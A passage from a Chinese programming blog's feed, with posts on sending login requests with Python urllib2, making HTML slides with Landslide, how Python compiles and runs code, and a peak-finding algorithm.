<p>注意上面字典的定义方式还有一种，下面的写法是等价的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div></pre></td><td class="code"><pre><div class="line">import  urllib</div><div class="line"></div><div class="line">import  urllib2</div><div class="line"></div><div class="line">values  =  &#123;&#125;</div><div class="line"></div><div class="line">values[&apos;username&apos;]  =  &quot;1016903103@qq.com&quot;</div><div class="line"></div><div class="line">values[&apos;password&apos;]  =  &quot;XXXX&quot;</div><div class="line"></div><div class="line">data  =  urllib.urlencode(values)</div><div class="line"></div><div class="line">url  =  &quot;http://passport.csdn.net/account/login?from=http://my.csdn.net/my/mycsdn&quot;</div><div class="line"></div><div class="line">request  =  urllib2.Request(url,data)</div><div class="line"></div><div class="line">response  =  urllib2.urlopen(request)</div><div class="line"></div><div class="line">print  response.read()</div></pre></td></tr></table></figure></p>
<p>以上方法便实现了POST方式的传送</p>
<h4 id="GET方式："><a href="#GET方式：" class="headerlink" title="GET方式："></a>GET方式：</h4><p>至于GET方式我们可以直接把参数写到网址上面，直接构建一个带参数的URL出来即可。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line">import  urllib</div><div class="line"></div><div class="line">import  urllib2</div><div class="line"></div><div class="line">values=&#123;&#125;</div><div class="line"></div><div class="line">values[&apos;username&apos;]  =  &quot;1016903103@qq.com&quot;</div><div class="line"></div><div class="line">values[&apos;password&apos;]=&quot;XXXX&quot;</div><div class="line"></div><div class="line">data  =  urllib.urlencode(values)</div><div class="line"></div><div class="line">url  =  &quot;http://passport.csdn.net/account/login&quot;</div><div class="line"></div><div class="line">geturl  =  url  +  &quot;?&quot;+data</div><div class="line"></div><div class="line">request  =  urllib2.Request(geturl)</div><div class="line"></div><div class="line">response  =  urllib2.urlopen(request)</div><div class="line"></div><div class="line">print  response.read()</div></pre></td></tr></table></figure></p>
<p>你可以print geturl，打印输出一下url，发现其实就是原来的url加？然后加编码后的参数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://passport.csdn.net/account/login?username=1016903103%40qq.com&amp;password=XXXX</div></pre></td></tr></table></figure></p>
<p>和我们平常GET访问方式一模一样，这样就实现了数据的GET方式传送。</p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;分分钟扒一个网页下来&quot;&gt;&lt;a href=&quot;#分分钟扒一个网页下来&quot; class=&quot;headerlink&quot; title=&quot;分分钟扒一个网页下来&quot;&gt;&lt;/a&gt;分分钟扒一个网页下来&lt;/h3&gt;&lt;p&gt;怎样扒网页呢？其实就是根据URL来获取它的网页信息，虽然我们在浏览器中看到的
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>工具|使用Markdowm写PPT</title>
    <link href="http://yoursite.com/2018/03/19/%E5%B7%A5%E5%85%B7-%E4%BD%BF%E7%94%A8Markdowm%E5%86%99PPT/"/>
    <id>http://yoursite.com/2018/03/19/工具-使用Markdowm写PPT/</id>
    <published>2018-03-19T10:41:53.000Z</published>
    <updated>2018-03-19T09:16:15.293Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>Landslide是基于Google的html5slides的一个Slide生成工具，可以将markdown, ReST 或者 textile文件转化成HTML5的slide。该转化支持内联模式，即生成一个具有完整功能的HTML文件，将依赖的css等东西放入其中，很容易用来分享。</p>
<ol>
<li>安装：该工具是用python写成的，使用pip工具安装。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ pip install landslide</div></pre></td></tr></table></figure>
</li>
</ol>
<p>也可以使用源码安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$ git clone https://github.com/adamzap/landslide.git</div><div class="line">$ cd landslide</div><div class="line">$ python setup.py build</div><div class="line">$ sudo python setup.py install</div></pre></td></tr></table></figure></p>
<ol>
<li>书写你的md文件，以下是官方提供的测试用例，可以生成这个页面，或者参考我的源码和这里的演示效果。<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"># Landslide</div><div class="line"></div><div class="line">---</div><div class="line"></div><div class="line"># Overview</div><div class="line"></div><div class="line">Generate HTML5 slideshows from markdown, ReST, or textile.</div><div class="line"></div><div class="line">![python](http://i.imgur.com/bc2xk.png)</div><div class="line"></div><div class="line">Landslide is primarily written in Python, but it&apos;s themes use:</div><div class="line"></div><div class="line">- HTML5</div><div class="line">- Javascript</div><div class="line">- CSS</div><div class="line"></div><div class="line">---</div><div class="line"></div><div class="line"># Code Sample</div><div class="line"></div><div class="line">Landslide supports code snippets</div><div class="line"></div><div class="line">    !python</div><div class="line">    def log(self, message, level=&apos;notice&apos;):</div><div class="line">        if self.logger and not callable(self.logger):</div><div class="line">            raise ValueError(u&quot;Invalid logger set, must be a callable&quot;)</div><div class="line"></div><div class="line">        if self.verbose and self.logger:</div><div class="line">            self.logger(message, level)</div></pre></td></tr></table></figure>
</li>
</ol>
<p>执行命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ landslide file.md -i -o &gt; name_you_like.html</div></pre></td></tr></table></figure></p>
<p>将markdown文本file.md转化成你的slide文件name_you_like.html。参数-i是为了将所有依赖文件（如css）整合到这一个文件中，让你能够简单的分享和移动该slide。-o参数是讲输出重定向到标准输出流，再用&gt; file来指定保存的文件名，也可以不使用该参数生成默认文件名presentation.html。</p>
<ol>
<li>在浏览器中打开生成的HTML文件就可以看到你的PPT了，效果酷炫，还支持各种快捷键。以下列出了一些常用的：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">h:      展示帮助</div><div class="line">← →:    上/下一张幻灯片</div><div class="line">ESC:    展示目录</div><div class="line">n:      显示当前是第几张幻灯片</div><div class="line">b:      屏幕全黑</div><div class="line">e:      使当前幻灯片最大化</div><div class="line">3:      展示伪3D效果</div><div class="line">c:      取消显示前后幻灯片预览，只显示当前幻灯片</div></pre></td></tr></table></figure>
</li>
</ol>
<h3 id="使用PrinceXML生成PDF"><a href="#使用PrinceXML生成PDF" class="headerlink" title="使用PrinceXML生成PDF"></a>使用PrinceXML生成PDF</h3><p>PrinceXML是一款将html转换为pdf的工具，提供免费带水印版试用。</p>
<p>下载地址：</p>
<blockquote>
<p><a href="http://www.princexml.com/download/" target="_blank" rel="external">http://www.princexml.com/download/</a></p>
</blockquote>
<p>选择对应版本解压后执行脚本安装：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ sh insatll.sh</div></pre></td></tr></table></figure></p>
<p>指定路径安装完毕后即可使用prince命令。</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$ prince test.html -o test.pdf</div></pre></td></tr></table></figure>
<p>即可生成需要的PDF PPT文件。</p>
<p><a href="https://www.jianshu.com/p/e063303317cb" target="_blank" rel="external">用Markdown写一个极客范儿的PPT</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简介&quot;&gt;&lt;a href=&quot;#简介&quot; class=&quot;headerlink&quot; title=&quot;简介&quot;&gt;&lt;/a&gt;简介&lt;/h3&gt;&lt;p&gt;Landslide是基于Google的html5slides的一个Slide生成工具，可以将markdown, ReST 或者 textil
    
    </summary>
    
      <category term="工具" scheme="http://yoursite.com/categories/%E5%B7%A5%E5%85%B7/"/>
    
    
      <category term="工具" scheme="http://yoursite.com/tags/%E5%B7%A5%E5%85%B7/"/>
    
  </entry>
  
  <entry>
    <title>python|python的运行的原理</title>
    <link href="http://yoursite.com/2018/03/19/python-python%E7%9A%84%E8%BF%90%E8%A1%8C%E7%9A%84%E5%8E%9F%E7%90%86/"/>
    <id>http://yoursite.com/2018/03/19/python-python的运行的原理/</id>
    <published>2018-03-18T23:37:05.000Z</published>
    <updated>2018-03-18T16:02:43.345Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简单的例子"><a href="#简单的例子" class="headerlink" title="简单的例子"></a>简单的例子</h3><p>先从一个简单的例子说起，包含了两个文件 foo.py 和 demo.py</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">[foo.py]</div><div class="line">def add(a, b):</div><div class="line">    return a + b</div></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[demo.py]</div><div class="line">import foo</div><div class="line">a = [1, &apos;python&apos;]</div><div class="line">a = &apos;a string&apos;</div><div class="line">def func():</div><div class="line">    a = 1</div><div class="line">    b = 257</div><div class="line">    print(a + b)</div><div class="line">print(a)</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    func()</div><div class="line">    foo.add(1, 2)</div></pre></td></tr></table></figure>
<p>执行这个程序<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python demo.py</div></pre></td></tr></table></figure></p>
<p>输出结果<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">a string</div><div class="line">258</div></pre></td></tr></table></figure></p>
<p>同时，该文件目录多出一个 foo.pyc 文件，如果是 Python 3，会多出一个 <strong>pycache</strong> 文件夹，.pyc 文件会在这个文件夹中。</p>
<h4 id="背后的魔法"><a href="#背后的魔法" class="headerlink" title="背后的魔法"></a>背后的魔法</h4><h5 id="模块"><a href="#模块" class="headerlink" title="模块"></a>模块</h5><p>Python 将 .py 文件视为一个 module，这些 module 中，有一个主 module，也就是程序运行的入口。在这个例子中，主 module 是 demo.py。</p>
<h5 id="编译"><a href="#编译" class="headerlink" title="编译"></a>编译</h5><p>执行 python demo.py 后，将会启动 Python 的解释器，然后将 demo.py 编译成一个字节码对象 PyCodeObject。</p>
<p>有的人可能会很好奇，编译的结果不应是 pyc 文件吗，就像 Java 的 class 文件，那为什么是一个对象呢，这里稍微解释一下。</p>
<p><strong>在 Python 的世界中，一切都是对象，函数也是对象，类型也是对象，类也是对象</strong>（类属于自定义的类型，在 Python 2.2 之前，int, dict 这些内置类型与类是存在不同的，在之后才统一起来，全部继承自 object），甚至连编译出来的字节码也是对象，.pyc 文件是字节码对象（PyCodeObject）在硬盘上的表现形式。</p>
<p>在运行期间，编译结果也就是 PyCodeObject 对象，只会存在于内存中，而当这个模块的 Python 代码执行完后，就会将编译结果保存到了 pyc 文件中，这样下次就不用编译，直接加载到内存中。<strong>pyc 文件只是 PyCodeObject 对象在硬盘上的表现形式</strong>。</p>
<p>这个 PyCodeObject 对象包含了 Python 源代码中的字符串，常量值，以及通过语法解析后编译生成的字节码指令。PyCodeObject 对象还会存储这些字节码指令与原始代码行号的对应关系，这样当出现异常时，就能指明位于哪一行的代码。</p>
<h5 id="pyc-文件"><a href="#pyc-文件" class="headerlink" title="pyc 文件"></a>pyc 文件</h5><p>一个 pyc 文件包含了三部分信息：Python 的 magic number、pyc 文件创建的时间信息，以及 PyCodeObject 对象。</p>
<p>magic number 是 Python 定义的一个整数值。一般来说，不同版本的 Python 实现都会定义不同的 magic number，这个值是用来保证 Python 兼容性的。比如要限制由低版本编译的 pyc 文件不能让高版本的 Python 程序来执行，只需要检查 magic number 不同就可以了。由于不同版本的 Python 定义的字节码指令可能会不同，如果不做检查，执行的时候就可能出错。</p>
<p>下面所示的代码可以来创建 pyc 文件，使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python generate_pyc.py module_name</div></pre></td></tr></table></figure></p>
<p>例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">python generate_pyc.py demo</div></pre></td></tr></table></figure></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">[generate_pyc.py]</div><div class="line">import imp</div><div class="line">import sys</div><div class="line">def generate_pyc(name):</div><div class="line">    fp, pathname, description = imp.find_module(name)</div><div class="line">    try:</div><div class="line">        imp.load_module(name, fp, pathname, description)    </div><div class="line">    finally:</div><div class="line">        if fp:</div><div class="line">            fp.close()</div><div class="line">if __name__ == &apos;__main__&apos;:</div><div class="line">    generate_pyc(sys.argv[1])</div></pre></td></tr></table></figure>
<h5 id="字节码指令"><a href="#字节码指令" class="headerlink" title="字节码指令"></a>字节码指令</h5><p>为什么 pyc 文件也称作字节码文件？因为这些文件存储的都是一些二进制的字节数据，而不是能让人直观查看的文本数据。</p>
<p>Python 标准库提供了用来生成代码对应字节码的工具 dis。dis 提供一个名为 dis 的方法，这个方法接收一个 code 对象，然后会输出 code 对象里的字节码指令信息。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">s = open(&apos;demo.py&apos;).read()</div><div class="line">co = compile(s, &apos;demo.py&apos;, &apos;exec&apos;)</div><div class="line">import dis</div><div class="line">dis.dis(co)</div></pre></td></tr></table></figure></p>
<p>执行上面这段代码可以输出 demo.py 编译后的字节码指令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div></pre></td><td class="code"><pre><div class="line">1           0 LOAD_CONST               0 (-1)</div><div class="line">             3 LOAD_CONST               1 (None)</div><div class="line">             6 IMPORT_NAME              0 (foo)</div><div class="line">             9 STORE_NAME               0 (foo)</div><div class="line"> 3          12 LOAD_CONST               2 (1)</div><div class="line">            15 LOAD_CONST               3 (u&apos;python&apos;)</div><div class="line">            18 BUILD_LIST               2</div><div class="line">            21 STORE_NAME               1 (a)</div><div class="line"> 4          24 LOAD_CONST               4 (u&apos;a string&apos;)</div><div class="line">            27 STORE_NAME               1 (a)</div><div class="line"> 6          30 LOAD_CONST               5 (&lt;code object func at 00D97650, file &quot;demo.py&quot;, line 6&gt;)</div><div class="line">            33 MAKE_FUNCTION            0</div><div class="line">            36 STORE_NAME               2 (func)</div><div class="line">11          39 LOAD_NAME                1 (a)</div><div class="line">            42 PRINT_ITEM          </div><div class="line">            43 PRINT_NEWLINE       </div><div class="line">13          44 LOAD_NAME                3 (__name__)</div><div class="line">            47 LOAD_CONST               6 (u&apos;__main__&apos;)</div><div class="line">            50 COMPARE_OP               2 (==)</div><div class="line">            53 POP_JUMP_IF_FALSE       82</div><div class="line">14          56 LOAD_NAME                2 (func)</div><div class="line">            59 CALL_FUNCTION            0</div><div class="line">            62 POP_TOP             </div><div class="line">15          63 LOAD_NAME                0 (foo)</div><div class="line">            66 LOAD_ATTR                4 (add)</div><div class="line">            69 LOAD_CONST               2 (1)</div><div class="line">            72 LOAD_CONST               7 (2)</div><div class="line">            75 CALL_FUNCTION            2</div><div class="line">            78 POP_TOP             </div><div class="line">            79 JUMP_FORWARD             0 (to 82)</div><div class="line">       &gt;&gt;   82 LOAD_CONST               1 (None)</div><div class="line">            85 RETURN_VALUE</div></pre></td></tr></table></figure>
<h5 id="Python-虚拟机"><a href="#Python-虚拟机" class="headerlink" title="Python 虚拟机"></a>Python 虚拟机</h5><p>demo.py 被编译后，接下来的工作就交由 Python 虚拟机来执行字节码指令了。Python 虚拟机会从编译得到的 PyCodeObject 对象中依次读入每一条字节码指令，并在当前的上下文环境中执行这条字节码指令。我们的程序就是通过这样循环往复的过程才得以执行。</p>
<h5 id="import-指令"><a href="#import-指令" class="headerlink" title="import 指令"></a>import 指令</h5><p>demo.py 的第一行代码是 import foo。import 指令用来载入一个模块，另外一个载入模块的方法是 from xx import yy。用 from 语句的好处是，可以只复制需要的符号变量到当前的命名空间中（关于命名空间将在后面介绍）。</p>
<p>前文提到，当已经存在 pyc 文件时，就可以直接载入而省去编译过程。但是代码文件的内容会更新，如何保证更新后能重新编译而不入旧的 pyc 文件呢。答案就在 pyc 文件中存储的创建时间信息。当执行 import 指令的时候，如果已存在 pyc 文件，Python 会检查创建时间是否晚于代码文件的修改时间，这样就能判断是否需要重新编译，还是直接载入了。如果不存在 pyc 文件，就会先将 py 文件编译。</p>
<h5 id="绝对引入和相对引入"><a href="#绝对引入和相对引入" class="headerlink" title="绝对引入和相对引入"></a>绝对引入和相对引入</h5><p>前文已经介绍了 import foo 这行代码。这里隐含了一个问题，就是 foo 是什么，如何找到 foo。这就属于 Python 的模块引入规则，这里不展开介绍，可以参考 pep-0328。</p>
<h5 id="赋值语句"><a href="#赋值语句" class="headerlink" title="赋值语句"></a>赋值语句</h5><p>接下来，执行到 a = [1, ‘python’]，这是一条赋值语句，定义了一个变量 a，它对应的值是 [1, ‘python’]。这里要解释一下，变量是什么呢？</p>
<blockquote>
<p>变量是一个存储位置和一个关联的符号名字，这个存储位置包含了一些已知或未知的量或者信息。</p>
</blockquote>
<p>变量实际上是一个字符串的符号，用来关联一个存储在内存中的对象。在 Python 中，会使用 dict（就是 Python 的 dict 对象）来存储变量符号（字符串）与一个对象的映射。</p>
<p>那么赋值语句实际上就是用来建立这种关联，在这个例子中是将符号 a 与一个列表对象 [1, ‘python’] 建立映射。</p>
<p>紧接着的代码执行了 a = ‘a string’，这条指令则将符号 a 与另外一个字符串对象 a string 建立了映射。今后对变量 a 的操作，将反应到字符串对象 a string 上。</p>
<h5 id="def-指令"><a href="#def-指令" class="headerlink" title="def 指令"></a>def 指令</h5><p>我们的 Python 代码继续往下运行，这里执行到一条 def func()，从字节码指令中也可以看出端倪 MAKE_FUNCTION。没错这条指令是用来创建函数的。<strong>Python 是动态语言，def 实际上是执行一条指令，用来创建函数（class 则是创建类的指令），而不仅仅是个语法关键字。</strong>函数并不是事先创建好的，而是执行到的时候才创建的。</p>
<p>def func() 将会创建一个名称为 func 的函数对象。实际上是先创建一个函数对象，然后将 func 这个名称符号绑定到这个函数上。</p>
<blockquote>
<p>Python 中是无法实现 C 和 Java 中的重载的，因为重载要求函数名要相同，而参数的类型或数量不同，但是 Python 是通过变量符号（如这里的 func）来关联一个函数，当我们用 def 语句再次创建一个同名的函数时，这个变量名就绑定到新的函数对象上了。</p>
</blockquote>
<h5 id="动态类型"><a href="#动态类型" class="headerlink" title="动态类型"></a>动态类型</h5><p>继续看函数 func 里面的代码，这时又有一条赋值语句 a = 1。变量 a 现在已经变成了第三种类型，它现在是一个整数了。那么 Python 是怎么实现动态类型的呢？答案就藏在具体存储的对象上。变量 a 仅仅只是一个符号（实际上是一个字符串对象），类型信息是存储在对象上的。在 Python 中，对象机制的核心是类型信息和引用计数（引用计数属于垃圾回收的部分）。</p>
<blockquote>
<p>用 type(a)，可以输出 a 的类型，这里是 int</p>
</blockquote>
<p>b = 257 跳过，我们直接来看看 print(a + b)，print 是输出函数，这里略过。这里想要探究的是 a + b。</p>
<p>因为 a 和 b 并不存储类型信息，因此当执行 a + b 的时候就必须先检查类型，比如 1 + 2 和 “1” + “2” 的结果是不一样的。</p>
<p>看到这里，我们就可以想象一下执行一句简单的 a + b，Python 虚拟机需要做多少繁琐的事情了。首先需要分别检查 a 和 b 所对应对象的类型，还要匹配类型是否一致（1 + “2” 将会出现异常），然后根据对象的类型调用正确的 + 函数（例如数值的 + 或字符串的 +），而 CPU 对于上面这条语句只需要执行 ADD 指令（还需要先将变量 MOV 到寄存器）。</p>
<h5 id="命名空间-namespace"><a href="#命名空间-namespace" class="headerlink" title="命名空间 (namespace)"></a>命名空间 (namespace)</h5><p>在介绍上面的这些代码时，还漏掉了一个关键的信息就是命名空间。在 Python 中，类、函数、module 都对应着一个独立的命名空间。而一个独立的命名空间会对应一个 PyCodeObject 对象，所以上面的 demo.py 文件编译后会生成两个 PyCodeObject，只是在 demo.py 这个 module 层的 PyCodeObject 中通过一个变量符号 func 嵌套了一个函数的 PyCodeObject。</p>
<p>命名空间的意义，就是用来确定一个变量符号到底对应什么对象。命名空间可以一个套一个地形成一条命名空间链，Python 虚拟机在执行的过程中，会有很大一部分时间消耗在从这条命名空间链中确定一个符号所对应的对象是什么。</p>
<p>在 Python中，命名空间是由一个 dict 对象实现的，它维护了（name，obj）这样的关联关系。</p>
<p>说到这里，再补充一下 import foo 这行代码会在 demo.py 这个模块的命名空间中，创建一个新的变量名 foo，foo 将绑定到一个 PyCodeObject 对象，也就是 foo.py 的编译结果。</p>
<h5 id="dir-函数"><a href="#dir-函数" class="headerlink" title="dir 函数"></a>dir 函数</h5><p>Python 的内置函数 dir 可以用来查看一个命名空间下的所有名字符号。一个用处是查看一个命名空间的所有属性和方法（这里的命名空间就是指类、函数、module）。</p>
<p>比如，查看当前的命名空间，可以使用 dir()，查看 sys 模块，可以使用 dir(sys)。</p>
<h5 id="LEGB-规则"><a href="#LEGB-规则" class="headerlink" title="LEGB 规则"></a>LEGB 规则</h5><p>Python 使用 LEGB 的顺序来查找一个符号对应的对象</p>
<blockquote>
<p>locals -&gt; enclosing function -&gt; globals -&gt; builtins</p>
</blockquote>
<p>locals，当前所在命名空间（如函数、模块），函数的参数也属于命名空间内的变量</p>
<p>enclosing，外部嵌套函数的命名空间（闭包中常见）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">def fun1(a):</div><div class="line">    def fun2():</div><div class="line">        # a 位于外部嵌套函数的命名空间</div><div class="line">        print(a)</div></pre></td></tr></table></figure></p>
<p>globals，全局变量，函数定义所在模块的命名空间</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">a = 1</div><div class="line">def fun():</div><div class="line">    # 需要通过 global 指令来声明全局变量</div><div class="line">    global a</div><div class="line">    # 修改全局变量，而不是创建一个新的 local 变量</div><div class="line">    a = 2</div></pre></td></tr></table></figure>
<p>builtins，内置模块的命名空间。Python 在启动的时候会自动为我们载入很多内置的函数、类，比如 dict，list，type，print，这些都位于 <strong>builtins</strong> 模块中，可以使用 dir(<strong>builtins</strong>) 来查看。这也是为什么我们在没有 import 任何模块的情况下，就能使用这么多丰富的函数和功能了。</p>
<p>介绍完命名空间，就能理解 print(a) 这行代码输出的结果为什么是 a string 了。</p>
<h5 id="内置属性-name"><a href="#内置属性-name" class="headerlink" title="内置属性 name"></a>内置属性 <strong>name</strong></h5><p>现在到了解释 if <strong>name</strong> == ‘<strong>main</strong>‘ 这行代码的时候了。当 Python 程序启动后，Python 会自动为每个模块设置一个属性 <strong>name</strong> 通常使用的是模块的名字，也就是文件名，但唯一的例外是主模块，主模块将会被设置为 <strong>main</strong>。利用这一特性，就可以做一些特别的事。比如当该模块以主模块来运行的时候，可以运行测试用例。而当被其他模块 import 时，则只是乖乖的，提供函数和功能就好。</p>
<h5 id="多线程"><a href="#多线程" class="headerlink" title="多线程"></a>多线程</h5><p>demo.py 这个例子并没有用到多线程，但还是有必要提一下。</p>
<p>在提到多线程的时候，往往要关注线程如何同步，如何访问共享资源。Python 是通过一个全局解释器锁 GIL（Global Interpreter Lock）来实现线程同步的。当 Python 程序只有单线程时，并不会启用 GIL，而当用户创建了一个 thread 时，表示要使用多线程，Python 解释器就会自动激活 GIL，并创建所需要的上下文环境和数据结构。</p>
<p>Python 字节码解释器的工作原理是按照指令的顺序一条一条地顺序执行，Python 内部维护着一个数值，这个数值就是 Python 内部的时钟，如果这个数值为 N，则意味着 Python 在执行了 N 条指令以后应该立即启动线程调度机制，可以通过下面的代码获取这个数值。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">import sys</div><div class="line">sys.getcheckinterval() # 100</div></pre></td></tr></table></figure></p>
<p>线程调度机制将会为线程分配 GIL，获取到 GIL 的线程就能开始执行，而其他线程则必须等待。由于 GIL 的存在，Python 的多线程性能十分低下，无法发挥多核 CPU 的优势，性能甚至不如单线程。因此如果你想用到多核 CPU，一个建议是使用多进程。</p>
<h5 id="垃圾回收"><a href="#垃圾回收" class="headerlink" title="垃圾回收"></a>垃圾回收</h5><p>在讲到垃圾回收的时候，通常会使用引用计数的模型，这是一种最直观，最简单的垃圾收集技术。Python 同样也使用了引用计数，但是引用计数存在这些缺点：</p>
<ul>
<li>频繁更新引用计数会降低运行效率</li>
<li>引用计数无法解决循环引用问题<br>Python 在引用计数机制的基础上，使用了主流垃圾收集技术中的标记——清除和分代收集两种技术。</li>
</ul>
<p><a href="https://www.restran.net/2015/10/22/how-python-code-run/" target="_blank" rel="external">谈谈 Python 程序的运行原理</a></p>
]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;简单的例子&quot;&gt;&lt;a href=&quot;#简单的例子&quot; class=&quot;headerlink&quot; title=&quot;简单的例子&quot;&gt;&lt;/a&gt;简单的例子&lt;/h3&gt;&lt;p&gt;先从一个简单的例子说起，包含了两个文件 foo.py 和 demo.py&lt;/p&gt;
&lt;figure class=&quot;hi
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
    
      <category term="python" scheme="http://yoursite.com/tags/python/"/>
    
  </entry>
  
  <entry>
    <title>计算机算法|分支法</title>
    <link href="http://yoursite.com/2018/03/16/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%88%86%E6%94%AF%E6%B3%95/"/>
    <id>http://yoursite.com/2018/03/16/计算机算法-分支法/</id>
    <published>2018-03-16T10:26:41.000Z</published>
    <updated>2018-03-18T16:06:27.188Z</updated>
    
    <content type="html"><![CDATA[<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><h3 id="一些案例"><a href="#一些案例" class="headerlink" title="一些案例"></a>一些案例</h3><h4 id="寻找峰值"><a href="#寻找峰值" class="headerlink" title="寻找峰值"></a>寻找峰值</h4><h5 id="一维数组"><a href="#一维数组" class="headerlink" title="一维数组"></a>一维数组</h5><p>直观地说，将数组两头边界视为负无穷大，则 不小于 两边的数就是一个峰。如下图所示，7、6、9都是此数组的峰。</p>
<p><img src="./images/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%AE%97%E6%B3%95-%E5%88%86%E6%B2%BB%E6%B3%95-01.png" alt="一维数组" title="计算机算法-分治法-01"></p>
<p>方案1.1 由定义出发，遍历所有元素即可，由于只要求找一个峰，找到即结束。易知最坏情况（即只有最后一个元素满足条件）的复杂度为(n)。</p>
<p>算法优化<br>注意到问题的要求，并不需要找到所有的峰，而方案1.1在最坏情况下遍历所有元素的消耗与寻找所有的峰等同，所以很有可能做了无用功。</p>
<p>注意到数组有峰的性质，只要子数组两端的元素仍然不小于其外侧相邻的元素，这样的性质就能在子数组中得到保持，我们采取二分的方法，这里用伪代码表示：</p>
